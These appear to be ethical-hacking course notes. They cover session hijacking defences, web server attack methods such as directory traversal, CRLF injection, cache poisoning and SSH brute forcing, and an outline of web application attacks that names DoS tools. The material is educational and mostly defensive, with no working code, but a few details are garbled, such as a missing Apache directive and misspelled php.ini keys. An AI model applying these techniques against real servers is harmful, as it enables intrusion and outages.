      Normal Telnet Session
      Forcing an ARP Entry
Automatic Method
  Intrusion Detection Systems(IDS)
  Intrusion Prevention System(IPS)
Use Secure Shell(SSH) to create a secure communication channel.
Pass the authentication cookies over HTTPS connection
Implement the log-out functionality for user to end the session
Generate the session ID after successful login and accept sessions IDs  generated by server only.
Ensure data in transit is encrypted  and implement defense-in-depth mechanism.
Use string or long random number as a session key
Use different user name and passwords for different accounts
Educate the employees and minimize remote access
Implement timeout() to destroy the session when expired
Do not transport session IDs in query string
Use strong authentication(like Kerberos) or peer-to-peer VPNs
Use IDs products or ARPwatch for monitoring ARP cache poisoning
Use encrypted protocols that are available at OpenSSH suite.
xxv) Session Hijacking Countermeasures 2
-For Web Developers
Create session keys with lengtly strings or random number so that it is difficult for an attacker to guess a valid session key
Regenerate the session ID after a successful login to prevent session fixation attack
Encrypt the data and session key that is transferred between the user and web servers.
Expire the session as soon as the user logs out
Prevent Eavesdropping within the network
Reduce the life span of a session or a cookie.
-For Web developers
Do not click on the links that are received through mails or IMs
Use firewall to prevent the malicious content from entering the network
Use firewall and browser settings to restrict cookies
Make sure that the website is certified by the certifying authorities
Make sure you clear history, offline content, and cookies from your browser after every confidential and sensitive transation
Prefer https, a secure transmission, rather than http
Logout from the browser instead of closing the browser
xxvi) Introduction to IPSec
IPSec is a protocol suite developed by the IETF for securing IP communications by authentication and encrypting each IP packet of a communication session
It is developed widely to implement virtual private networks(VPNs) and for remote user access through dial-up connection to private networks.
-Benefits
Network-level peer authentication
Data origin authentication
Data integrity
Data confidentiality
Replay protection

#Hacking Web Servers
i) Introduction to Web Servers
-On hardware side
A web server is a computer that stores web server software and a website component files(e.g HTML documents, image, CSS stylesheets, and JavaScript files).
-On the software side,
A web server includes several parts that control how web users access hosted files, at minimum an HTTP server.
An HTTP server is a piece of software that understands URLs(web addresses) and HTTP(The protocol your browser uses to view webpages)
It can be accessed through the domain names (like mozilla.org) of websites it stores, and delivers their content to the end-user's device.
-A static web server, or stack, consists of a computer (hardware) with an HTTP server(software).
-A dynamic web server consists of a static web server plus extra software, most commonly an application server and a database.
ii)Types of Web Servers
-Apache HTTP Server
This is the most popular web server developed by the Apache Software Foundation.
Apache web server is an open source software and can be installed on almost all operating systems including Linux, UNIX, Windows, FreeBSD, Mac OS and more.
About 40% of the web server machines run Apache Web Server.
-IIS Web Server
A Microsoft product, IIS is a server that offers all the features such as Apache. Since it's not an open source, adding personal modules as well as modifying becomes a bit difficult.
It supports all the platforms that run Windows operating system. Additionally, you also get good customer support, if there is any issue.
-Nginx web server
Nginx is the next open source web server after Apache. It comprises of IMAP/POP3 proxy server.
The significant features offered by Nginx are high performance, stability, simple configuration and low resource usage.
No threads are used to handle the requests by Nginx, instead a highly scalable event-driven architecture that uses small and predictable amount of memory under load is utilized. It has become popular recently and hosts about 20% of all the domains globally.
-LiteSpeed Server
A high-performance Apache drop-in replacement, LiteSpeed(LSWS) is the 4th popular web server on the internet.
When you upgrade your web server to LiteSpeed, you will experience improved performance that too with low operating cost.
It has the ability to load Apache configuration files directly and can replace the Apache within 15 minutes without any downtime.
-Apache Tomcat Server
An open source Java servlet container, Apache Tomcat funtions as a web server. Java serverlets are java equivalent to other dynamic web content technologies such as PHP and ASP.NET.
Apache Tomcat is typically used to run Java applications.
-Node.js Server
Node.js is basically a server-side JavaScript environment that is used for network applications such as web servers.
Node.js difers from other popular web servers because it is mainly a cross-platform runtime environment for building network applications with.
An event-driver architecture is applied by Node.js which is capable of asynchronous I/O. Due to these design choices throughput and scalability are optimized in web applications which helps to run real-time communication and browser games.
iii) Web Server Security Stack
Custom Web applications==>>Business logical Flaws technical vulnerabilities
Third party components==>>Open Source / Commercial
Database ==>> Oracle/Mysql/MS SQL
WebServer==>> Apache/MicrosoftIIS
Operating System==>> Windows/Linux/OS X
Network==>>Router/Switch
Security==>>IPS/IDS
iv)Why Web Servers are Compromised
Improper file and directory permissions.
Installing the server with default settings
Unnecessary services enabled, including content management and remote administration.
Security conflicts with business ease-of-use case.
Lack of proper security policy, procedures and maintenance.
Improper authentication with external systems.
Default accounts with their default or no passwords
Unnecessary default, backups, or sample files
Misconfiguration in web server, operating systems, and networks.
Bugs in server software, OS and web applications.
Misconfigured SSL certificates and encryption settings.
Use of self-signed certificates and default certificates.
-Impacts
Compromise of user accounts
Website defacement
Secondary attacks from the Website
Root access to other applications or servers
Data tampering and data theft.
v)Web Server Attack Methods
-DoS/DDoS Attack
To crash the webserver running the application, attacker targets the following services by consuming the webserver with fake requests:
Network bandwidth
Server memory
Application exception handling mechanism
CPU usage
Hard disk space
Database space
-DNS Server Attacks
Attacker compromises DNS server and changes the DNS settings so that all the request coming toward the target web server should be redirected to his/her own malicious server.
-DNS Amplification Attack
Attacker takes advantages of DNS recursive method of DNS redirection to perform DNS amplification attack.
Attacker uses compromised PCs with spoofed IP addresses to amplify the DDoS attacks on victims DNS server by exploiting DNS recursive method
vi) Directory Traversal Attack
The root directory is a specific directory on the server file system in which the users are confined. Users are not able to access anything above this root.
In directory traversal attacks, attackers use ../(dot-dot-slash) sequence to access restricted directories outside of the web server root directory.
Attackers can use trial and error method to navigate the outside of root directory and access sensitive information in the system.
With a system vulnerable, an attacker can step out of the root system.
vii) Directory Listing Attack
Even if Directory listing is disabled, attackers might discover and exploit web server vulnerabilities. For examplr There was an old Apache Tomcat vulnerabilities, where improper handling of null bytes(%00) and backslace(\) made it prone to directory listing attacks.
-How to disable directory listing
In Apache, you can disable directory listing by setting the options directive in the apache https.conf file by adding the following line:
Or in .htaccess file as: Options-Index
viii) Website Defacement
Web defacement occurs when an intruder maliciously alters visual appearance of a web page by inserting or substituing provocation and frequently offending data.
Defaced pages exposes visitors to some propaganda or misleading information until the unauthorized change is discovered and corrected.
Attackers uses variety of methods such as MYSQL injection to access a site in order to deface it.
ix) WebServer Misconfiguration
Server misconfiguration refers to configuration weaknesses in web infracture that can be exploited to launch various attacks on web servers such as directory traversal, and data theft.
Sample configuration, and Scripts Files
Anonymous or default passwords
verbous debug/error messages
Misconfigured SSL Certificates
Unnecessary Services Enabled
Remote Administrator Functions
-The configuration gives verbose error messages
php.ini file
display_error=On
log-errors=On
error-log=syslog
inore_repeated_errors=Off
x) HTTP Response Splitting or CRLF Injection
HTTP response splliting attack involves adding header response data into the input field so that the server split the response into two responses.
The attacker can control the second response to redirect user to a malicios website whereas the other responses will be discarded by web browser.
The application must allow input that contains CR(carriage return, also given by %0d or \r) and LF(line feed, also given by %0a or \n) characters into the header AND underlying platform must be vulnerable to the injection of such characters.
These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allow them to create additional responses entirely under their control.
xi) Web Cache Poisoning Attack
An attacker forces the web server cache to flush its actual cache content and sends a specilly crafted request, which will be stored in cache.
xii) SSH and Password Cracking
SSH protocols are used to create an encrypted SSH tunnel between two hosts in order to transfer unencrypted data over an insecure network.
It works on TCP port 22
Attackers can bruteforce SSH login credentials to gain unauthorized access to a SSH tunnel
SSH tunnels can be used to transmit malwares  and other exploits to victims without being detected.
-Attacker target mainly for:
SMTP server
Web Server
SSH Tunnels
Web form authentication cracking
FTP servers
-Passwords can be cracked by using following techniques:
Guessing
Dictionary
Brute Force
Hybrid
Rainbow Table
 Creating a Table
xiii) Directory Traversal in action
xiv) Directory Traversal Portswigger
xv) HTTP Splitting webgoat
xvi) HTTP Response splitting bWAPP
xvii) Web Cache Poisoning Webgoat
xviii)  Web Cache Poisoning Portswigger
xix) Countermeasures and Patch management
Hotfixes are an update to fix a specific customer issue and not always distributed outside the customer organization.
A patch is a small piece of software designed to fix problems, security vulnerabilities, and bugs and improper the performance of a computer program or its supporting data.
Users may be notified through emails or through the vendor's website
A patch can be considered as a repair job to a programming problem
What is Patch Management?
Patch management is a process used to ensure that the appropriate patches are installed on a system and help fix known vulnerabilities
-An automated patch management process
Detect: Use tools to detect missing security patches
Assess: Asses the issue and its associated severity by mitigating the factors that may influnce the decision
Acquire: Download the patch for testing
xx) Countermeasures 2
-Web Servers in Separate Secure Segment
An ideal web hosting network should be designed with at least three segments namely Internet segment, secure server security segment often called demilitarized zone(DMZ) internal network.
Place the web server in Server Security Segment(DMZ) of the network isolated from public network as well is internal network.
The firewalls should be place for internal network as well as Internet traffic going towards DMZ.
Use secure web permissions, NTFS permissions and .NET Framework access control meechanisms including URL authorization
Slow down brute force and dictionary attacks with strong password policies, and then audit and alert for logon failures
Run processes using least priviledged accounts as well as least priviledged service and user accounts.
xxi) Countermeasures 3

#Hacking Web Applications
i) Introduction to Web Applications
ii) Web Application Attack Methodology Footprinting infrastruture
-Footprinting
  -server discovery
        whois lookup
        dns interrogation
        port scanning
        telnet
        openssl.exe
  -service discovery
        nmap
        netscan tools pro
        Sandcat browser
  -hidden content discovery
        show in web archive, subdomain
  -detect proxies:
        use TRACE method of HTTP/1.1
  -Detecting Web firewall:
        use tools such as WAFW00F
  -Web spidering:
        OWASP Zed Attack Proxy
        Burp Suite
        WebScarab
  -Attacker-Directed Spidering
        OWASP Zed attack proxy, Burpsuit
  -Brute force
iii) Web application Attack Methodology Attacking web servers
tools used:
urlscan
nikto
nessus
acunetix web vulnerability
webInspect
-Launch DoS against web server
  DoSHTTP, Hping, Loci and Xoic, SYN Flooding, Slowloris, DRDos.
iv) Web application Attack Methodology analyzing web application
-Identify Server-Side Functionality
Examine page source and URLs and make an educated guess to determine the internal structure and functionality of web applications.
-Tools used
  GUN Wget, Teleport Pro, BlackWindow
-Examine URL:
v) Web application Attack Methodology attacking authentication and authorization
vi) Web application Attack Methodology Performing various attack

vii) Web application Attack Methodology attacking web clients
viii) Introduction to burpsuit
ix) Burpsuit Basics, Working and Setup
x) Burpsuit Target and Spider Modules
xi) Burpsuit sequencer and scanner
xii) Burpsuit repeater module
xiii) Burpsuit intruder and comparer modules
xiv)Unvalidated input
Input validation flaws refers to a web application vulnerability where input from a client is not validated before being processed by web applications and backend servers.
An attacker exploits input validation flaws to perform cross-site scripting, buffer overflow, injection attacks etc that result in data theft and systems malfunctioning.
xv) Parameter tampering and Hidden field Manipulation
When a user makes selections on an HTML page, the selection is typically stored as form field values and sent to the application as an HTTP request.
Attacker can examine the HTML code of the page and change the hidden field values in order to change post requests to server.
xvi)OWASP Top 10: Information Dislosure
xvii) OWASP Top 10:Injection Flaws
xviii) Introduction to SQL Injection
xix) Hands on SQL Injection
xx) sqlmap Overview
xxi)Blind SQL Injection
xxii) Hands on Blind SQL Injection
xxiii) Introduction to OS command Injection
xxiv) Hands on OS Command Injection on PortSwigger
xxv) Hands on OS Command Injection on DVWA
xxvi)OWASP Top 10: Introduction to Broken Authentication and Session Management
xxvii)Hands on Broken Authentication and Session Management
xxviii)OWASP Top 10: Introduction to Broken Access Control
xxix)Hands on Broken Access Control
xxx)OWASP Top 10: Introduction to Cross Site Scripting
xxxi)Hands on XSS on PortSwigger
xxxii)Hands on XSS on DVWA
xxxiii)Introduction to DOM Based XSS
xxxiv)Understaning DOM Based XSS
xxxv)Hands on DOM based XSS
xxxvi)Introduction to Cross Site Request Forgery
xxxvii)Hands on CSRF on PortSwigger
xxxviii)Hands on CSRF on DVWA
xxxix)Complete Application Level DOS
xl)OWASP Top 10: Complete Unvalidated Redirects and Forwards
xli)Complete Local and Remote File Inclusion
xlii)Complete Clickjacking
xliii)Test for Clickjacking
xliv)Complete IDOR
xlv)Complete CORS Misconfiguration
xlvi)Hands on Buffer Overflow
xlvii)Introduction to Server Side Request Forgery
xlviii)Hands on SSRF
xlix)OWASP Top 10: Introduction to XML External Entities
l)Hands on XXE
li)Complete Server Side Template Injection
lii)OWASP Top 10: Introduction to Insecure Deserialization
Serialization refers to the process of converting an object into a format that can be easily stored or transmitted over a network, typically as a sequence of bytes. Deserialization is the process of converting this sequence of bytes back into an object.
liii)Hands on Insecure Deserialization
liv)OWASP Top 10: Insufficient Logging and Monitoring
Without sufficient logging and monitoring, it can be difficult or impossible to identify security incidents or breaches. For example, if a system is hacked, the lack of monitoring may prevent the security team from being able to detect the intrusion, determine the extent of the damage, and take appropriate action.
lv)OWASP Top 10: Known Vulnerable Components
lvi)Web attack Countermeasures 1
lvii)Web attack Countermeasures 2
lviii)Web attack Countermeasures 3
